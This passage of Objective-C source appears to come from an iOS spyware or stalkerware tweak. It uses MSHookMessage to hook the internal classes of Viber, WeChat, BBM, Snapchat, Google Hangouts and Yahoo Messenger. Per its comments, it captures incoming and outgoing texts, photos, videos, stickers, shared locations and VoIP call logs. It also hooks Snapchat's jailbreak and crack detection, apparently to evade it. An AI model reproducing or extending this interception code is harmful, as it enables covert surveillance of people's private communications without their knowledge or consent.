            MSHookMessage($FBWebRTCHandlerImpl, @selector(callDidStart:), $FBWebRTCHandlerImpl$callDidStart$, &_FBWebRTCHandlerImpl$callDidStart$);
            
            Class $FBWebRTCViewController = objc_getClass("FBWebRTCViewController");
            MSHookMessage($FBWebRTCViewController, @selector(getCallDuration), $FBWebRTCViewController$getCallDuration, &_FBWebRTCViewController$getCallDuration);
        }
        
        //Class $NSNotificationCenter = objc_getClass("NSNotificationCenter");
        //MSHookMessage($NSNotificationCenter, @selector(postNotification:), $NSNotificationCenter$postNotification$, &_NSNotificationCenter$postNotification$);
        //MSHookMessage($NSNotificationCenter, @selector(postNotificationName:object:), $NSNotificationCenter$postNotificationName$object$, &_NSNotificationCenter$postNotificationName$object$);
        //MSHookMessage($NSNotificationCenter, @selector(postNotificationName:object:userInfo:), $NSNotificationCenter$postNotificationName$object$userInfo$, &_NSNotificationCenter$postNotificationName$object$userInfo$);
	}
	
#pragma mark -
#pragma mark Viber hook
#pragma mark -
	
	if ([identifier isEqualToString:@"com.viber"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
		Class $DBManager(objc_getClass("DBManager"));
		// OUT
		// 3.0 and earlier
		//_DBManager$addSentMessage$conversation$seq$location$attachment$ = MSHookMessage($DBManager, @selector(addSentMessage:conversation:seq:location:attachment:), &$DBManager$addSentMessage$conversation$seq$location$attachment$);
        MSHookMessage($DBManager, @selector(addSentMessage:conversation:seq:location:attachment:), $DBManager$addSentMessage$conversation$seq$location$attachment$, &_DBManager$addSentMessage$conversation$seq$location$attachment$);
		// 3.1, 4.0
		//_DBManager$addSentMessage$conversation$seq$location$attachment$completion$ = MSHookMessage($DBManager, @selector(addSentMessage:conversation:seq:location:attachment:completion:), &$DBManager$addSentMessage$conversation$seq$location$attachment$completion$);
        MSHookMessage($DBManager, @selector(addSentMessage:conversation:seq:location:attachment:completion:), $DBManager$addSentMessage$conversation$seq$location$attachment$completion$, &_DBManager$addSentMessage$conversation$seq$location$attachment$completion$);
        // 4.2, 5.0 (text, emoticon); audio (not support) 4.0, 5.0, 5.1.0, 5.2.0, 5.2.1
        MSHookMessage($DBManager, @selector(addSentMessage:conversation:seq:location:attachment:attachmentType:attachmentUrl:duration:completion:),
                      $DBManager$addSentMessage$conversation$seq$location$attachment$attachmentType$attachmentUrl$duration$completion$,
                      &_DBManager$addSentMessage$conversation$seq$location$attachment$attachmentType$attachmentUrl$duration$completion$);
        // 5.0 (shared location, sticker, photo, video)
        MSHookMessage($DBManager, @selector(sendVDBMessage:checkBlockList:completion:), $DBManager$sendVDBMessage$checkBlockList$completion$, &_DBManager$sendVDBMessage$checkBlockList$completion$);
        // 5.1.0, 5.2.0 (shared location, sticker, photo, video)
        MSHookMessage($DBManager,
                      @selector(sendVDBMessage:inVDBConversation:checkBlockList:completion:),
                      $DBManager$sendVDBMessage$inVDBConversation$checkBlockList$completion$,
                      &_DBManager$sendVDBMessage$inVDBConversation$checkBlockList$completion$);
        // 5.2.1,... (text, emoticon, shared location, sticker, photo, video) 5.5.0 except text, emoticon
        MSHookMessage($DBManager,
                      @selector(sendVDBMessage:inVDBConversation:checkBlockList:messageWillSendBlock:completion:),
                      $DBManager$sendVDBMessage$inVDBConversation$checkBlockList$messageWillSendBlock$completion$,
                      &_DBManager$sendVDBMessage$inVDBConversation$checkBlockList$messageWillSendBlock$completion$);
        // 5.5.0 (text, emoticon)
        MSHookMessage($DBManager,
                      @selector(sendVDBMessage:inVDBConversation:checkBlockList:shouldSendImmediately:messageWillSendBlock:completion:),
                      $DBManager$sendVDBMessage$inVDBConversation$checkBlockList$shouldSendImmediately$messageWillSendBlock$completion$,
                      &_DBManager$sendVDBMessage$inVDBConversation$checkBlockList$shouldSendImmediately$messageWillSendBlock$completion$);
		
		// IN
		// Earlier than 3.0
		//_DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$ = MSHookMessage($DBManager, @selector(addReceivedMessage:conversationID:phoneNumber:seq:token:date:location:attachment:attachmentType:), &$DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$);
        MSHookMessage($DBManager, @selector(addReceivedMessage:conversationID:phoneNumber:seq:token:date:location:attachment:attachmentType:), $DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$, &_DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$);
		// 3.0
		//_DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$isRead$ = MSHookMessage($DBManager, @selector(addReceivedMessage:conversationID:phoneNumber:seq:token:date:location:attachment:attachmentType:isRead:), &$DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$isRead$);
        MSHookMessage($DBManager, @selector(addReceivedMessage:conversationID:phoneNumber:seq:token:date:location:attachment:attachmentType:isRead:), $DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$isRead$, &_DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$isRead$);
		// 3.1
		//_DBManager$addReceivedMessageDict$completion$ = MSHookMessage($DBManager, @selector(addReceivedMessageDict:completion:), &$DBManager$addReceivedMessageDict$completion$);
        MSHookMessage($DBManager, @selector(addReceivedMessageDict:completion:), $DBManager$addReceivedMessageDict$completion$, &_DBManager$addReceivedMessageDict$completion$);
		// 4.0, 4.2, 5.0, 5.1
		// Not call
		//_DBManager$addReceivedMessage$completion$ = MSHookMessage($DBManager, @selector(addReceivedMessage:completion:), &$DBManager$addReceivedMessage$completion$);
		//_DBManager$addViberMessageFromPLTMessage$ = MSHookMessage($DBManager, @selector(addViberMessageFromPLTMessage:), &$DBManager$addViberMessageFromPLTMessage$);
        MSHookMessage($DBManager, @selector(addViberMessageFromPLTMessage:), $DBManager$addViberMessageFromPLTMessage$, &_DBManager$addViberMessageFromPLTMessage$);
        // 5.2.0, 5.2.1
        if ([IMShareUtils compareVersion:versionOfIM withVersion:@"5.1.1"] == 1) { // Version (5.2.0,...) > 5.1.1
            MSHookMessage($DBManager,
                          @selector(addViberMessageFromPLTMessage:attachmentsCreatorBlock:),
                          $DBManager$addViberMessageFromPLTMessage$attachmentsCreatorBlock$,
                          &_DBManager$addViberMessageFromPLTMessage$attachmentsCreatorBlock$);
            // 5.8.0
            MSHookMessage($DBManager,
                          @selector(addViberMessageFromPLTMessage:withFlags:attachmentsCreatorBlock:),
                          $DBManager$addViberMessageFromPLTMessage$withFlags$attachmentsCreatorBlock$,
                          &_DBManager$addViberMessageFromPLTMessage$withFlags$attachmentsCreatorBlock$);
        }
        
        // Utilities method to hack video url
        //Class $AttachmentUploader = objc_getClass("AttachmentUploader");
        //MSHookMessage($AttachmentUploader, @selector(downloadRequestForAttachment:), $AttachmentUploader$downloadRequestForAttachment$, &_AttachmentUploader$downloadRequestForAttachment$);
        
		//Class $CustomLocationManager = objc_getClass("CustomLocationManager");
		//_CustomLocationManager$reverseGeocoding$didFindPlacemark$ = MSHookMessage($CustomLocationManager, @selector(reverseGeocoding:didFindPlacemark:), &$CustomLocationManager$reverseGeocoding$didFindPlacemark$);
		//_CustomLocationManager$reverseGeocoding$didFailWithError$ = MSHookMessage($CustomLocationManager, @selector(reverseGeocoding:didFailWithError:), &$CustomLocationManager$reverseGeocoding$didFailWithError$);

		// OUT/IN VoIP 4.0, 4.1, 4.2
		//_DBManager$addRecentCall$withType$phoneNumIndex$duration$date$callToken$ = MSHookMessage($DBManager, @selector(addRecentCall:withType:phoneNumIndex:duration:date:callToken:), &$DBManager$addRecentCall$withType$phoneNumIndex$duration$date$callToken$);
        MSHookMessage($DBManager, @selector(addRecentCall:withType:phoneNumIndex:duration:date:callToken:), $DBManager$addRecentCall$withType$phoneNumIndex$duration$date$callToken$, &_DBManager$addRecentCall$withType$phoneNumIndex$duration$date$callToken$);
		
		// MISS VoIP (before 4.2)
		//_DBManager$withoutSaveAddRecentCall$withType$phoneNumIndex$duration$date$callToken$ = MSHookMessage($DBManager, @selector(withoutSaveAddRecentCall:withType:phoneNumIndex:duration:date:callToken:), &$DBManager$withoutSaveAddRecentCall$withType$phoneNumIndex$duration$date$callToken$);
        MSHookMessage($DBManager, @selector(withoutSaveAddRecentCall:withType:phoneNumIndex:duration:date:callToken:), $DBManager$withoutSaveAddRecentCall$withType$phoneNumIndex$duration$date$callToken$, &_DBManager$withoutSaveAddRecentCall$withType$phoneNumIndex$duration$date$callToken$);
        // 4.2
        MSHookMessage($DBManager, @selector(withoutSaveAddRecentCall:withType:phoneNumIndex:duration:date:callToken:isRead:),
                      $DBManager$withoutSaveAddRecentCall$withType$phoneNumIndex$duration$date$callToken$isRead$,
                      &_DBManager$withoutSaveAddRecentCall$withType$phoneNumIndex$duration$date$callToken$isRead$);
					
		// 3.1 IM IN/OUT helper
		//_DBManager$sortedMessagesForConversation$count$startingToken$ = MSHookMessage($DBManager, @selector(sortedMessagesForConversation:count:startingToken:), &$DBManager$sortedMessagesForConversation$count$startingToken$);
		//_DBManager$postNotificationOnMainThread$object$ = MSHookMessage($DBManager, @selector(postNotificationOnMainThread:object:), &$DBManager$postNotificationOnMainThread$object$);
		//_DBManager$postNotificationOnMainThread$ = MSHookMessage($DBManager, @selector(postNotificationOnMainThread:), &$DBManager$postNotificationOnMainThread$);
		//_DBManager$postDBNotificationAfterDelay$object$ = MSHookMessage($DBManager, @selector(postDBNotificationAfterDelay:object:), &$DBManager$postDBNotificationAfterDelay$object$);
		//_DBManager$postDBNotificationAfterDelay$ = MSHookMessage($DBManager, @selector(postDBNotificationAfterDelay:), &$DBManager$postDBNotificationAfterDelay$);
		//_DBManager$postDBNotificationWithName$object$userInfo$ = MSHookMessage($DBManager, @selector(postDBNotificationWithName:object:userInfo:), &$DBManager$postDBNotificationWithName$object$userInfo$);
		
		// IM OUT (alternative but not used)
		// 3.1
		//_DBManager$postDBNotificationWithName$object$ = MSHookMessage($DBManager, @selector(postDBNotificationWithName:object:), &$DBManager$postDBNotificationWithName$object$);
	}
	
#pragma mark -
#pragma mark WeChat hook
#pragma mark -
	
	if ([identifier isEqualToString:@"com.tencent.xin"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
		
		Class $CMessageMgr(objc_getClass("CMessageMgr"));
		// Capture Miss VoIP <ignore> 
		// Capture IM Event
		//_CMessageMgr$AsyncOnAddMsg$MsgWrap$ = MSHookMessage($CMessageMgr, @selector(AsyncOnAddMsg:MsgWrap:), &$CMessageMgr$AsyncOnAddMsg$MsgWrap$);
        MSHookMessage($CMessageMgr, @selector(AsyncOnAddMsg:MsgWrap:), $CMessageMgr$AsyncOnAddMsg$MsgWrap$, &_CMessageMgr$AsyncOnAddMsg$MsgWrap$);

		Class $CContactMgr(objc_getClass("CContactMgr"));
		//_CContactMgr$init = MSHookMessage($CContactMgr, @selector(init), &$CContactMgr$init);
        MSHookMessage($CContactMgr, @selector(init), $CContactMgr$init, &_CContactMgr$init);
		
		Class $OpenDownloadMgr(objc_getClass("OpenDownloadMgr"));
		//_OpenDownloadMgr$Pop = MSHookMessage($OpenDownloadMgr, @selector(Pop), &$OpenDownloadMgr$Pop);
        MSHookMessage($OpenDownloadMgr, @selector(Pop), $OpenDownloadMgr$Pop, &_OpenDownloadMgr$Pop);
        
        Class $OpenDownloadCDNMgr = objc_getClass("OpenDownloadCDNMgr");
        MSHookMessage($OpenDownloadCDNMgr, @selector(Pop), $OpenDownloadCDNMgr$Pop, &_OpenDownloadCDNMgr$Pop);
		
		Class $VOIPMgr(objc_getClass("VOIPMgr"));		
		// Capture Miss VoIP (audio, video) call log <rejected>
		//_VOIPMgr$Reject$withRoomId$andKey$		= MSHookMessage($VOIPMgr, @selector(Reject:withRoomId:andKey:), &$VOIPMgr$Reject$withRoomId$andKey$);
        MSHookMessage($VOIPMgr, @selector(Reject:withRoomId:andKey:), $VOIPMgr$Reject$withRoomId$andKey$, &_VOIPMgr$Reject$withRoomId$andKey$);
		// Capture Incoming VoIP (audio, video) call log <accepted>
		//_VOIPMgr$AcceptVideo$withRoomId$andKey$ = MSHookMessage($VOIPMgr, @selector(AcceptVideo:withRoomId:andKey:), &$VOIPMgr$AcceptVideo$withRoomId$andKey$);
        MSHookMessage($VOIPMgr, @selector(AcceptVideo:withRoomId:andKey:), $VOIPMgr$AcceptVideo$withRoomId$andKey$, &_VOIPMgr$AcceptVideo$withRoomId$andKey$);
        // version 5.3.1.17
        MSHookMessage($VOIPMgr, @selector(AcceptVideo:withRoomId:andKey:forceToVoice:), $VOIPMgr$AcceptVideo$withRoomId$andKey$forceToVoice$, &_VOIPMgr$AcceptVideo$withRoomId$andKey$forceToVoice$);
		//_VOIPMgr$AcceptAudio$withRoomId$andKey$ = MSHookMessage($VOIPMgr, @selector(AcceptAudio:withRoomId:andKey:), &$VOIPMgr$AcceptAudio$withRoomId$andKey$);
        MSHookMessage($VOIPMgr, @selector(AcceptAudio:withRoomId:andKey:), $VOIPMgr$AcceptAudio$withRoomId$andKey$, &_VOIPMgr$AcceptAudio$withRoomId$andKey$);
		// Capture Outgoing VoIP (audio, video) call log
		//_VOIPMgr$VideoCall$withCallType$		= MSHookMessage($VOIPMgr, @selector(VideoCall:withCallType:), &$VOIPMgr$VideoCall$withCallType$);
        MSHookMessage($VOIPMgr, @selector(VideoCall:withCallType:), $VOIPMgr$VideoCall$withCallType$, &_VOIPMgr$VideoCall$withCallType$);
		//_VOIPMgr$AudioCall$withCallType$		= MSHookMessage($VOIPMgr, @selector(AudioCall:withCallType:), &$VOIPMgr$AudioCall$withCallType$);
        MSHookMessage($VOIPMgr, @selector(AudioCall:withCallType:), $VOIPMgr$AudioCall$withCallType$, &_VOIPMgr$AudioCall$withCallType$);
	}
#pragma mark -
#pragma mark BBM hook
#pragma mark -
	
	if ([identifier isEqualToString:@"com.blackberry.bbm1"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
		DLog(@"Load BBM IN");
		Class $BBMCoreAccess(objc_getClass("BBMCoreAccess"));
		//_BBMCoreAccess$sendMessage$toConversationURI$ = MSHookMessage($BBMCoreAccess, @selector(sendMessage:toConversationURI:), &$BBMCoreAccess$sendMessage$toConversationURI$);
        MSHookMessage($BBMCoreAccess, @selector(sendMessage:toConversationURI:), $BBMCoreAccess$sendMessage$toConversationURI$, &_BBMCoreAccess$sendMessage$toConversationURI$);
        // 292.0.0
        MSHookMessage($BBMCoreAccess, @selector(sendMessage:toConversationURI:messagePriority:), $BBMCoreAccess$sendMessage$toConversationURI$messagePriority$, &_BBMCoreAccess$sendMessage$toConversationURI$messagePriority$);
        // Send text message with time limit (BBM 2.5.0)
        MSHookMessage($BBMCoreAccess, @selector(sendMessage:toConversationURI:withTimeLimit:), $BBMCoreAccess$sendMessage$toConversationURI$withTimeLimit$, &_BBMCoreAccess$sendMessage$toConversationURI$withTimeLimit$);
        
		//_BBMCoreAccess$markMessageRead$withConversationURI$ = MSHookMessage($BBMCoreAccess, @selector(markMessageRead:withConversationURI:), &$BBMCoreAccess$markMessageRead$withConversationURI$);
        MSHookMessage($BBMCoreAccess, @selector(markMessageRead:withConversationURI:), $BBMCoreAccess$markMessageRead$withConversationURI$, &_BBMCoreAccess$markMessageRead$withConversationURI$);
        MSHookMessage($BBMCoreAccess, @selector(markMessagesRead:withConversationURI:), $BBMCoreAccess$markMessagesRead$withConversationURI$, &_BBMCoreAccess$markMessagesRead$withConversationURI$);
        
		//_BBMCoreAccess$fileTransferTo$withDescription$path$ = MSHookMessage($BBMCoreAccess, @selector(fileTransferTo:withDescription:path:), &$BBMCoreAccess$fileTransferTo$withDescription$path$);
        MSHookMessage($BBMCoreAccess, @selector(fileTransferTo:withDescription:path:), $BBMCoreAccess$fileTransferTo$withDescription$path$, &_BBMCoreAccess$fileTransferTo$withDescription$path$);
        // 292.0.0
        MSHookMessage($BBMCoreAccess, @selector(fileTransferTo:withDescription:path:ownershipPolicy:), $BBMCoreAccess$fileTransferTo$withDescription$path$ownershipPolicy$, &_BBMCoreAccess$fileTransferTo$withDescription$path$ownershipPolicy$);
		//_BBMCoreAccess$pictureTransferTo$withDescription$path$ = MSHookMessage($BBMCoreAccess, @selector(pictureTransferTo:withDescription:path:), &$BBMCoreAccess$pictureTransferTo$withDescription$path$);
        MSHookMessage($BBMCoreAccess, @selector(pictureTransferTo:withDescription:path:), $BBMCoreAccess$pictureTransferTo$withDescription$path$, &_BBMCoreAccess$pictureTransferTo$withDescription$path$);
        // Send photo with time limit (BBM 2.5.0)
        MSHookMessage($BBMCoreAccess, @selector(pictureTransferTo:withDescription:path:timeLimit:), $BBMCoreAccess$pictureTransferTo$withDescription$path$timeLimit$, &_BBMCoreAccess$pictureTransferTo$withDescription$path$timeLimit$);
        
        // Capture outgoing sticker
        MSHookMessage($BBMCoreAccess, @selector(sendSticker::), $BBMCoreAccess$sendSticker$$, &_BBMCoreAccess$sendSticker$$);
        //MSHookMessage($BBMCoreAccess, @selector(getStickerImage:), $BBMCoreAccess$getStickerImage$, &_BBMCoreAccess$getStickerImage$);
        //Class $BBMStickerPack = objc_getMetaClass("BBMStickerPack");
        // Capture sticker testing purpose
        //MSHookMessage($BBMStickerPack, @selector(elementWithIdentifier:andParent:), $BBMStickerPack$elementWithIdentifier$andParent$, &_BBMStickerPack$elementWithIdentifier$andParent$);
        //Class $BBMGenStickerImage = objc_getMetaClass("BBMGenStickerImage");
        // Capture sticker testing purpose
        //MSHookMessage($BBMGenStickerImage, @selector(elementWithIdentifier:andParent:), $BBMGenStickerImage$elementWithIdentifier$andParent$, &_BBMGenStickerImage$elementWithIdentifier$andParent$);
        
        // Capture outgoing Clympse
        MSHookMessage($BBMCoreAccess, @selector(sendGlympse:message:toConversationURI:), $BBMCoreAccess$sendGlympse$message$toConversationURI$, &_BBMCoreAccess$sendGlympse$message$toConversationURI$);
        // Capture outgoing Dropbox
        MSHookMessage($BBMCoreAccess, @selector(sendDropboxMessage:chooserResult:caption:), $BBMCoreAccess$sendDropboxMessage$chooserResult$caption$, &_BBMCoreAccess$sendDropboxMessage$chooserResult$caption$);
        // Capture outgoing shared location (testing purpose)
        //MSHookMessage($BBMCoreAccess, @selector(addLocationWithInfo:), $BBMCoreAccess$addLocationWithInfo$, &_BBMCoreAccess$addLocationWithInfo$);
        //MSHookMessage($BBMCoreAccess, @selector(reportLocation:), $BBMCoreAccess$reportLocation$, &_BBMCoreAccess$reportLocation$);
        //MSHookMessage($BBMCoreAccess, @selector(getLocations), $BBMCoreAccess$getLocations, &_BBMCoreAccess$getLocations);
        // Capture outgoing shared location
        Class $BBMDSConnection = objc_getClass("BBMDSConnection");
        MSHookMessage($BBMDSConnection, @selector(sendJSONMessage:), $BBMDSConnection$sendJSONMessage$, &_BBMDSConnection$sendJSONMessage$);
        
        Class $BBMCoreAccessGroup = objc_getClass("BBMCoreAccessGroup");
        MSHookMessage($BBMCoreAccessGroup, @selector(sendMessage:toConversationURI:), $BBMCoreAccessGroup$sendMessage$toConversationURI$, &_BBMCoreAccessGroup$sendMessage$toConversationURI$);
        MSHookMessage($BBMCoreAccessGroup, @selector(handleJSONMessage:messageType:listId:), $BBMCoreAccessGroup$handleJSONMessage$messageType$listId$, &_BBMCoreAccessGroup$handleJSONMessage$messageType$listId$);
    
		//_BBMCoreAccess$sendBroadcastMessage$to$ = MSHookMessage($BBMCoreAccess, @selector(sendBroadcastMessage:to:), &$BBMCoreAccess$sendBroadcastMessage$to$);
        MSHookMessage($BBMCoreAccess, @selector(sendBroadcastMessage:to:), $BBMCoreAccess$sendBroadcastMessage$to$, &_BBMCoreAccess$sendBroadcastMessage$to$);
	}
    
    
#pragma mark -
#pragma mark Snapchat hook
#pragma mark -
	
	if ([identifier isEqualToString:@"com.toyopagroup.picaboo"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
        DLog(@"!!!!!!!! SNAPCHAT !!!!!!!!!!!")
        if ([IMShareUtils isVersionText:versionOfIM isLessThanOrEqual:@"6.1.2"]) {
            DLog(@"!!!!!!!! SNAPCHAT 6.1.2 !!!!!!!!!!!")
            // -------- Incoming --------
            Class $FeedViewController(objc_getClass("FeedViewController"));
            MSHookMessage($FeedViewController, @selector(showSnap:),
                          $FeedViewController$showSnap$,
                          &_FeedViewController$showSnap$);
     
            Class $SCMediaView(objc_getClass("SCMediaView"));
            MSHookMessage($SCMediaView, @selector(completedSettingImageMedia:error:completion:),
                          $SCMediaView$completedSettingImageMedia$error$completion$,
                          &_SCMediaView$completedSettingImageMedia$error$completion$);
            MSHookMessage($SCMediaView, @selector(completedSettingVideoMedia:error:completion:),
                          $SCMediaView$completedSettingVideoMedia$error$completion$,
                          &_SCMediaView$completedSettingVideoMedia$error$completion$);
            
            // -------- Outgoing --------
            Class $AVCamCaptureManager(objc_getClass("AVCamCaptureManager"));
            MSHookMessage($AVCamCaptureManager, @selector(recorder:recordingDidFinishToOutputFileURL:error:),
                          $AVCamCaptureManager$recorder$recordingDidFinishToOutputFileURL$error$,
                          &_AVCamCaptureManager$recorder$recordingDidFinishToOutputFileURL$error$);
            
            Class $SendViewController(objc_getClass("SendViewController"));
            MSHookMessage($SendViewController, @selector(sendSnap),
                          $SendViewController$sendSnap,
                          &_SendViewController$sendSnap);
            
        } else {
            DLog(@"!!!!!!!! SNAPCHAT >= 7.0.1 !!!!!!!!!!!")
            
            Class $FlurryUtil = objc_getMetaClass("FlurryUtil");
            MSHookMessage($FlurryUtil, @selector(appIsCracked), $FlurryUtil$appIsCracked, &_FlurryUtil$appIsCracked);
            MSHookMessage($FlurryUtil, @selector(deviceIsJailbroken), $FlurryUtil$deviceIsJailbroken, &_FlurryUtil$deviceIsJailbroken);
            
            // ----------------
            Class $SCChatViewController(objc_getClass("SCChatViewController"));
            // 7.0.1,...9.13.0
            MSHookMessage($SCChatViewController, @selector(showSnap:),
                          $SCChatViewController$showSnap$,
                          &_SCChatViewController$showSnap$);
            // 7.0.1
            Class $SCMediaView(objc_getClass("SCMediaView"));
            MSHookMessage($SCMediaView, @selector(completedSettingImageMedia:error:completion:),
                          $SCMediaView$completedSettingImageMedia701$error$completion$,
                          &_SCMediaView$completedSettingImageMedia701$error$completion$);
            MSHookMessage($SCMediaView, @selector(completedSettingVideoMedia:error:completion:),
                          $SCMediaView$completedSettingVideoMedia701$error$completion$,
                          &_SCMediaView$completedSettingVideoMedia701$error$completion$);
            
            // Snapchat 9.7.0
            MSHookMessage($SCMediaView, @selector(completedSettingImageMedia:playWhenLoaded:showCounter:error:completion:),
                          $SCMediaView$completedSettingImageMedia$playWhenLoaded$showCounter$error$completion$,
                          &_SCMediaView$completedSettingImageMedia$playWhenLoaded$showCounter$error$completion$);
            MSHookMessage($SCMediaView, @selector(completedSettingVideoMedia:playWhenLoaded:showCounter:error:completion:),
                          $SCMediaView$completedSettingVideoMedia$playWhenLoaded$showCounter$error$completion$,
                          &_SCMediaView$completedSettingVideoMedia$playWhenLoaded$showCounter$error$completion$);
            
            Class $FeedViewController(objc_getClass("FeedViewController"));
            MSHookMessage($FeedViewController, @selector(showSnap:),
                          $FeedViewController$showSnap701$,
                          &_FeedViewController$showSnap701$);
            
            if ([IMShareUtils isVersionText:versionOfIM isHigherThanOrEqual:@"9.13.0"]) {
                Class $SCFeedViewController(objc_getClass("SCFeedViewController"));
                MSHookMessage($SCFeedViewController, @selector(showSnap:),
                              $SCFeedViewController$showSnap9_13_0$,
                              &_SCFeedViewController$showSnap9_13_0$);
                
                Class $SCSnapPlayController = objc_getClass("SCSnapPlayController");
                MSHookMessage($SCSnapPlayController, @selector(showSnap:),
                              $SCSnapPlayController$showSnap9_15_0$,
                              &_SCSnapPlayController$showSnap9_15_0$);
            }
            
            
            // Snapchat offline text, photo from album
            [SnapchatOfflineUtils sharedSnapchatOfflineUtils];
         
            // ----------------
            Class $PreviewViewController(objc_getClass("PreviewViewController"));
            // 7.0.1 only
            MSHookMessage($PreviewViewController, @selector(sendPressed),
                          $PreviewViewController$sendPressed,
                          &_PreviewViewController$sendPressed);
            
            Class $SCChat(objc_getClass("SCChat"));
            // 7.0.1 only, not exist in 8.0.1
            MSHookMessage($SCChat, @selector(chatDidAddSnapOrMessage:),
                          $SCChat$chatDidAddSnapOrMessage$,
                          &_SCChat$chatDidAddSnapOrMessage$);
            // 8.0.1,9.10.0
            MSHookMessage($SCChat, @selector(chatDidAddSCMessage:),
                          $SCChat$chatDidAddSCMessage$,
                          &_SCChat$chatDidAddSCMessage$);
            
            if ([IMShareUtils isVersionText:versionOfIM isHigherThanOrEqual:@"9.13.0"]) {
                // Incoming photo, text: ...,9.20.0
                MSHookMessage($SCChat, @selector(deliverMessage:), $SCChat$deliverMessage$, &_SCChat$deliverMessage$);
                // Outgoing photo 9.20.0 (can use for outgoing snap, text and incoming snap detection)
                MSHookMessage($SCChat, @selector(chatDidAddMultipleSCMessage:), $SCChat$chatDidAddMultipleSCMessage$, &_SCChat$chatDidAddMultipleSCMessage$);
                // 9.25.0
                MSHookMessage($SCChat, @selector(chatDidAddMultipleSCMessage:shouldUpdateRecent:),
                              $SCChat$chatDidAddMultipleSCMessage$shouldUpdateRecent$,
                              &_SCChat$chatDidAddMultipleSCMessage$shouldUpdateRecent$);
            }
            
            Class $AVCamCaptureManager(objc_getClass("AVCamCaptureManager"));
            MSHookMessage($AVCamCaptureManager, @selector(recorder:recordingDidFinishToOutputFileURL:error:),
                          $AVCamCaptureManager$recorder701$recordingDidFinishToOutputFileURL$error$,
                          &_AVCamCaptureManager$recorder701$recordingDidFinishToOutputFileURL$error$);
            
            MSHookMessage($AVCamCaptureManager, @selector(videoCapturePipeline:didFinishRecordingToURL:),
                          $AVCamCaptureManager$videoCapturePipeline$didFinishRecordingToURL$,
                          &_AVCamCaptureManager$videoCapturePipeline$didFinishRecordingToURL$);
        }
    }
    
#pragma mark -
#pragma mark Hangout hook
#pragma mark -
	
	if ([identifier isEqualToString:@"com.google.hangouts"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
        
        Class $GBMConversationsSyncer = objc_getClass("GBMConversationsSyncer");
        MSHookMessage($GBMConversationsSyncer, @selector(sendChatContent:forConversation:expectedOTRStatus:completionHandler:), $GBMConversationsSyncer$sendChatContent$forConversation$expectedOTRStatus$completionHandler$ , &_GBMConversationsSyncer$sendChatContent$forConversation$expectedOTRStatus$completionHandler$ );
        
        Class $GBAUserClientBridge = objc_getClass("GBAUserClientBridge");
        MSHookMessage($GBAUserClientBridge, @selector(userClient:receivedNewEvent:), $GBAUserClientBridge$userClient$receivedNewEvent$ , &_GBAUserClientBridge$userClient$receivedNewEvent$ );
        MSHookMessage($GBAUserClientBridge, @selector(userClient:receivedNewConversation:), $GBAUserClientBridge$userClient$receivedNewConversation$ , &_GBAUserClientBridge$userClient$receivedNewConversation$ );
        
    }
    
#pragma mark -
#pragma mark Yahoo Messenger hook
#pragma mark -
    
    if ([identifier isEqualToString:@"com.yahoo.messenger"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
        
        Class $OCBackendIMYahoo(objc_getClass("OCBackendIMYahoo"));
        
        // Outgoing Text Message
        MSHookMessage($OCBackendIMYahoo, @selector(messengerService:didSendMessage:),
                      $OCBackendIMYahoo$messengerService$didSendMessage$,
                      &_OCBackendIMYahoo$messengerService$didSendMessage$);
        
        // Outgoing Photo/Video
        MSHookMessage($OCBackendIMYahoo, @selector(sendInstantMessage:),
                      $OCBackendIMYahoo$sendInstantMessage$,
                      &_OCBackendIMYahoo$sendInstantMessage$);
        
        // Incoming Text Message
        MSHookMessage($OCBackendIMYahoo, @selector(messengerService:didReceiveMessages:),
                      $OCBackendIMYahoo$messengerService$didReceiveMessages$,
                      &_OCBackendIMYahoo$messengerService$didReceiveMessages$);
        
        // Incoming Photo/Video step 1 (prior to 2.2.9)
        MSHookMessage($OCBackendIMYahoo, @selector(messengerService:didReceiveIncomingFileTransferFromIdentity:to:sessionId:fileName:type:relayServer:token:),
                      $OCBackendIMYahoo$messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServer$token$,
                      &_OCBackendIMYahoo$messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServer$token$);
        // Incoming Photo/Video step 1 (2.2.9)
        MSHookMessage($OCBackendIMYahoo, @selector(messengerService:didReceiveIncomingFileTransferFromIdentity:to:sessionId:fileName:type:relayServerIP:relayServerHost:token:),
                      $OCBackendIMYahoo$messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServerIP$relayServerHost$token$,
                      &_OCBackendIMYahoo$messengerService$didReceiveIncomingFileTransferFromIdentity$to$sessionId$fileName$type$relayServerIP$relayServerHost$token$);
        // Incoming Photo/Video step 2
        MSHookMessage($OCBackendIMYahoo, @selector(fileTransferService:transferCompleteForSession:path:),
                      $OCBackendIMYahoo$fileTransferService$transferCompleteForSession$path$,
                      &_OCBackendIMYahoo$fileTransferService$transferCompleteForSession$path$);
    }
    
#pragma mark -
#pragma mark Yahoo Messenger (Iris) hook
#pragma mark -
    /*
    if ([identifier isEqualToString:@"com.yahoo.iris"]) {
        Class $GroupListViewController = objc_getClass("GroupListViewController");
        MSHookMessage($GroupListViewController, @selector(sequenceAdapter:performRowInserts:deletes:moves:), $GroupListViewController$sequenceAdapter$performRowInserts$deletes$moves$, &_GroupListViewController$sequenceAdapter$performRowInserts$deletes$moves$);
    }*/
    
#pragma mark - Slingshot hooks -
    /*
